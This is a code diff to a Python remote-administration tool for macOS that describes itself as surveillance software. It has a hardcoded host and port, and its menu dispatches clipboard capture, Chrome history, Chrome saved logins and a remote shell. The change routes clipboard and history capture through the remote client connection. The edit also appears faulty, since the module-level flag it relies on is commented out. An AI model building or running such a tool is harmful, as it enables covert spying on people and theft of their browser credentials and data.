@@ -32,7 +32,8 @@ appDesc = "Remote administration and surveillance for macOS - With Python"
 appDate = "2021-08-18"
 conHost = "192.168.0.49"
 conPort = "6890"
-clientStarted = False
+
+# clientStarted = False
 
 def print_help():
     print(f'#========================================================================#')
@@ -57,10 +58,20 @@ def processInput(input):
         myreMac_server.start_server()
     elif input == "c":# or input == "help":
         myreMac_client.start_client()
+        global clientStarted
+        clientStarted = True
     elif input == "cb":# or input == "clipboard":
-        reMacModules[input].run_mod()
+        if clientStarted == True:
+            myreMac_client.start_client("cb")
+            pass
+        else:
+            reMacModules[input].run_mod()
     elif input == "ch":# or input == "chromeHistory":
-        reMacModules[input].run_mod()
+        if clientStarted == True:
+            myreMac_client.start_client(input)
+            pass
+        else:
+            reMacModules[input].run_mod()
     elif input == "cl":# or input == "chromeLogins":
         reMacModules[input].run_mod()
     elif input == "sh":# or input == "shell":
